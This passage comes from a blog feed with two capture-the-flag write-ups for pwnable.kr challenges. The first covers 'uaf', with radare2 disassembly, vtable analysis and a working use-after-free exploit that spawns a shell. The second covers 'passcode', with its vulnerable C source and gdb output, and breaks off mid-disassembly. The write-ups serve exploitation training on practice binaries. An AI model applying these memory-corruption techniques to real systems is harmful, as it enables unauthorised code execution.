|   ||| !   0x00401029      488b45a0       mov rax, qword [rbp - local_60h]
|   ||| !   0x0040102d      4883c010       add rax, 0x10
|   ||| !   0x00401031      488b00         mov rax, qword [rax]
|   ||| !   0x00401034      be00000000     mov esi, 0
|   ||| !   0x00401039      4889c7         mov rdi, rax
|   ||| !   0x0040103c      b800000000     mov eax, 0
|   ||| !   0x00401041      e87afdffff     call sym.imp.open          ; int open(const char *path, int oflag)
|   ||| !   0x00401046      488b55d8       mov rdx, qword [rbp - local_28h]
|   ||| !   0x0040104a      488b4de0       mov rcx, qword [rbp - local_20h]
|   ||| !   0x0040104e      4889ce         mov rsi, rcx
|   ||| !   0x00401051      89c7           mov edi, eax
|   ||| !   0x00401053      e848fcffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
|   ||| !   0x00401058      be13154000     mov esi, str.your_data_is_allocated ; &quot;your data is allocated&quot; @ 0x401513
|   ||| !   0x0040105d      bf60226000     mov edi, obj.std::cout      ; obj.std::cout
|   ||| !   0x00401062      e889fcffff     call sym.std::operator___std::char_traits_char__
|   ||| !   0x00401067      be600d4000     mov esi, sym.std::endl_char_std::char_traits_char__ ; sym.std::endl_char_std::char_traits_char__
|   ||| !   0x0040106c      4889c7         mov rdi, rax
|   ||| !   0x0040106f      e8dcfcffff     call sym.std::ostream::operator__
|   |||,==&amp;lt; 0x00401074      eb33           jmp 0x4010a9
|   ||||!      ; JMP XREF from 0x00400fbd (sym.main)
|   ||`---&amp;gt; 0x00401076      488b5dc8       mov rbx, qword [rbp - local_38h]
|   || |!   0x0040107a      4885db         test rbx, rbx
|   ||,===&amp;lt; 0x0040107d      7410           je 0x40108f
|   ||||!   0x0040107f      4889df         mov rdi, rbx
|   ||||!   0x00401082      e8b3010000     call sym.Human::_Human
|   ||||!   0x00401087      4889df         mov rdi, rbx
|   ||||!   0x0040108a      e8f1fbffff     call sym.operatordelete
|   ||||!      ; JMP XREF from 0x0040107d (sym.main)
|   ||`---&amp;gt; 0x0040108f      488b5dd0       mov rbx, qword [rbp - local_30h]
|   || |!   0x00401093      4885db         test rbx, rbx
|   ||,===&amp;lt; 0x00401096      7410           je 0x4010a8
|   ||||!   0x00401098      4889df         mov rdi, rbx
|   ||||!   0x0040109b      e89a010000     call sym.Human::_Human
|   ||||!   0x004010a0      4889df         mov rdi, rbx
|   ||||!   0x004010a3      e8d8fbffff     call sym.operatordelete
|   ||||!      ; JMP XREF from 0x00401096 (sym.main)
|   ||`---&amp;gt; 0x004010a8      90             nop
|   || ||      ; JMP XREF from 0x00401074 (sym.main)
|   || ||      ; JMP XREF from 0x00400ffb (sym.main)
|   || ||      ; JMP XREF from 0x00400fc8 (sym.main)
\   ``-``=&amp;lt; 0x004010a9      e9e4feffff     jmp 0x400f92
[0x00400ec4]&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here we can extract some basic bits of information essential for the further exploitation. First option &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is made from this code below.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;|   |`----&amp;gt; 0x00400fcd      488b45c8       mov rax, qword [rbp - local_38h]
|   | ||!   0x00400fd1      488b00         mov rax, qword [rax]
|   | ||!   0x00400fd4      4883c008       add rax, 8
|   | ||!   0x00400fd8      488b10         mov rdx, qword [rax]
|   | ||!   0x00400fdb      488b45c8       mov rax, qword [rbp - local_38h]
|   | ||!   0x00400fdf      4889c7         mov rdi, rax
|   | ||!   0x00400fe2      ffd2           call rdx
|   | ||!   0x00400fe4      488b45d0       mov rax, qword [rbp - local_30h]
|   | ||!   0x00400fe8      488b00         mov rax, qword [rax]
|   | ||!   0x00400feb      4883c008       add rax, 8
|   | ||!   0x00400fef      488b10         mov rdx, qword [rax]
|   | ||!   0x00400ff2      488b45d0       mov rax, qword [rbp - local_30h]
|   | ||!   0x00400ff6      4889c7         mov rdi, rax
|   | ||!   0x00400ff9      ffd2           call rdx&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we can see a repetive code for both calls of &lt;code class=&quot;highlighter-rouge&quot;&gt;introduce()&lt;/code&gt; methods. As we have instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;call rdx&lt;/code&gt; we can suspect that &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; holds the address of introduce method. Register &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; get’s it’s value from &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, qword [rax]&lt;/code&gt;, with additional incrementation of &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; value in &lt;code class=&quot;highlighter-rouge&quot;&gt;add rax, 8&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[0x0040123a]&amp;gt; pdf @sym.Man::Man
/ (fcn) sym.Man::Man 83
|   sym.Man::Man ();
|           ; var int local_24h @ rbp-0x24
|           ; var int local_20h @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|              ; CALL XREF from 0x00400f13 (sym.main)
|           0x00401264      55             push rbp
|           0x00401265      4889e5         mov rbp, rsp
|           0x00401268      53             push rbx
|           0x00401269      4883ec28       sub rsp, 0x28               ; '('
|           0x0040126d      48897de8       mov qword [rbp - local_18h], rdi
|           0x00401271      488975e0       mov qword [rbp - local_20h], rsi
|           0x00401275      8955dc         mov dword [rbp - local_24h], edx
|           0x00401278      488b45e8       mov rax, qword [rbp - local_18h]
|           0x0040127c      4889c7         mov rdi, rax
|           0x0040127f      e88cffffff     call sym.Human::Human
|           0x00401284      488b45e8       mov rax, qword [rbp - local_18h]
|           0x00401288      48c700701540.  mov qword [rax], 0x401570   ; [0x401570:8]=0x40117a sym.Human::give_shell ; &quot;z.@&quot;
|           0x0040128f      488b45e8       mov rax, qword [rbp - local_18h]
|           0x00401293      488d5010       lea rdx, [rax + 0x10]       ; 0x10
|           0x00401297      488b45e0       mov rax, qword [rbp - local_20h]
|           0x0040129b      4889c6         mov rsi, rax
|           0x0040129e      4889d7         mov rdi, rdx
|           0x004012a1      e80afbffff     call sym.std::string::operator_
|           0x004012a6      488b45e8       mov rax, qword [rbp - local_18h]
|           0x004012aa      8b55dc         mov edx, dword [rbp - local_24h]
|           0x004012ad      895008         mov dword [rax + 8], edx
|           0x004012b0      4883c428       add rsp, 0x28               ; '('
|           0x004012b4      5b             pop rbx
|           0x004012b5      5d             pop rbp
\           0x004012b6      c3             ret&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;With that information, we are ready to disassemble the &lt;code class=&quot;highlighter-rouge&quot;&gt;Man&lt;/code&gt; object and first thing that comes to my mind is this line &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword [rax], 0x401570   ; [0x401570:8]=0x40117a sym.Human::give_shell ; &quot;z.@&quot;&lt;/code&gt;. Now we can suspect that address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401570&lt;/code&gt; is the address of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Virtual_method_table&quot;&gt;vtable&lt;/a&gt; of this class.&lt;/p&gt;

&lt;p&gt;Every class containing virtual functions gets its own vtable that is used to resolve the address of te virtual function whenever such function is called. Luckily, we can list vtables with &lt;code class=&quot;highlighter-rouge&quot;&gt;radare2&lt;/code&gt; command &lt;code class=&quot;highlighter-rouge&quot;&gt;av&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[0x00400de0]&amp;gt; av?
|Usage: av analyze the .rodata section and list virtual function present


[0x00400de0]&amp;gt; av

Vtable Found at 0x00401550
0x00401550 : sym.Human::give_shell
0x00401558 : sym.Woman::introduce


Vtable Found at 0x00401570
0x00401570 : sym.Human::give_shell
0x00401578 : sym.Man::introduce


Vtable Found at 0x00401590
0x00401590 : sym.Human::give_shell
0x00401598 : sym.Human::introduce&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, our assumptions are correct and address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00401570&lt;/code&gt; is the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Man&lt;/code&gt; class vtable. But why after calling this address, method &lt;code class=&quot;highlighter-rouge&quot;&gt;introduce()&lt;/code&gt; is called instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell()&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;Coming back to disassembly of &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function, we have to remember that during the call address is incremented with &lt;code class=&quot;highlighter-rouge&quot;&gt;add rax, 8&lt;/code&gt;. So in order to call the &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell()&lt;/code&gt; function, we have to decrement &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00401570&lt;/code&gt; by 8.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00401570&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0x401568'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell()&lt;/code&gt; that we can use in our exploit. Few runs of &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; option may guarantee that these bytes are at correct place.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;uaf@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print(&quot;\x68\x15\x40\x00\x00\x00\x00\x00&quot;)'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/attackme
uaf@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./uaf 8 /tmp/attackme
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag  
yay_f1ag_aft3r_pwning&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
</description>
        <pubDate>Sun, 08 Jul 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/pwnable.kr-uaf/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-uaf/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - passcode</title>
        <description>&lt;p&gt;To my surprise, I’ve noticed that I have missed one previous challenge called &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;. Let’s come back to it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@pwnable.kr&lt;span class=&quot;s1&quot;&gt;'s password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '&lt;/span&gt; / |  D  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   _/|  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; |___ |    _]    |    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|    / 
|  |  |  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type &quot;irssi&quot; command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Thu Jun 28 12:59:34 2018 from 213.57.214.26
passcode@ubuntu:~$ ls -la
total 36
drwxr-x---  5 root passcode     4096 Oct 23  2016 .
drwxr-xr-x 87 root root         4096 Dec 27 23:17 ..
d---------  2 root root         4096 Jun 26  2014 .bash_history
-r--r-----  1 root passcode_pwn   48 Jun 26  2014 flag
dr-xr-xr-x  2 root root         4096 Aug 20  2014 .irssi
-r-xr-sr-x  1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r--  1 root root          858 Jun 26  2014 passcode.c
drwxr-xr-x  2 root root         4096 Oct 23  2016 .pwntools-cache&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As we have the source code available to us, we can start by taking a look at it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode1 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// ha! mommy told me that 32bit is vulnerable to bruteforcing :)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode2 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checking...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;338150&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13371337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login OK!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login Failed!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter you name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%100s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome %s!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Toddler's Secure Login System 1.0 beta.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// something after login...&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Now I can safely trust you that you have credential :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From the start we can see two simple mistakes in &lt;code class=&quot;highlighter-rouge&quot;&gt;login()&lt;/code&gt; function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As we know, &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; will read the data from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; according to the format parameter and will store it in a &lt;strong&gt;location&lt;/strong&gt; (where location is just an address of the variable) passed by the other parameters. So both &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode2&lt;/code&gt; variables should be dereferenced in order to properly save the variables just like this.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So after that we know that solving this challenge by the classic mean of entering hardcoded password from source won’t work. Let’s fire up &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; to study this binary, looking for potential flaws.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;passcode@ubuntu:~$ gdb ./passcode 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
Reading symbols from ./passcode...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048665 &amp;lt;+0&amp;gt;:	push   ebp
   0x08048666 &amp;lt;+1&amp;gt;:	mov    ebp,esp
   0x08048668 &amp;lt;+3&amp;gt;:	and    esp,0xfffffff0
   0x0804866b &amp;lt;+6&amp;gt;:	sub    esp,0x10
   0x0804866e &amp;lt;+9&amp;gt;:	mov    DWORD PTR [esp],0x80487f0
   0x08048675 &amp;lt;+16&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x0804867a &amp;lt;+21&amp;gt;:	call   0x8048609 &amp;lt;welcome&amp;gt;
   0x0804867f &amp;lt;+26&amp;gt;:	call   0x8048564 &amp;lt;login&amp;gt;
   0x08048684 &amp;lt;+31&amp;gt;:	mov    DWORD PTR [esp],0x8048818
   0x0804868b &amp;lt;+38&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x08048690 &amp;lt;+43&amp;gt;:	mov    eax,0x0
   0x08048695 &amp;lt;+48&amp;gt;:	leave  
   0x08048696 &amp;lt;+49&amp;gt;:	ret    
End of assembler dump.
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 &amp;lt;+0&amp;gt;:	push   ebp
   0x08048565 &amp;lt;+1&amp;gt;:	mov    ebp,esp
   0x08048567 &amp;lt;+3&amp;gt;:	sub    esp,0x28
   0x0804856a &amp;lt;+6&amp;gt;:	mov    eax,0x8048770
   0x0804856f &amp;lt;+11&amp;gt;:	mov    DWORD PTR [esp],eax
   0x08048572 &amp;lt;+14&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048577 &amp;lt;+19&amp;gt;:	mov    eax,0x8048783
   0x0804857c &amp;lt;+24&amp;gt;:	mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f &amp;lt;+27&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
   0x08048583 &amp;lt;+31&amp;gt;:	mov    DWORD PTR [esp],eax
   0x08048586 &amp;lt;+34&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;
   0x0804858b &amp;lt;+39&amp;gt;:	mov    eax,ds:0x804a02c
   0x08048590 &amp;lt;+44&amp;gt;:	mov    DWORD PTR [esp],eax
   0x08048593 &amp;lt;+47&amp;gt;:	call   0x8048430 &amp;lt;fflush@plt&amp;gt;
   0x08048598 &amp;lt;+52&amp;gt;:	mov    eax,0x8048786
   0x0804859d &amp;lt;+57&amp;gt;:	mov    DWORD PTR [esp],eax
   0x080485a0 &amp;lt;+60&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x080485a5 &amp;lt;+65&amp;gt;:	mov    eax,0x8048783
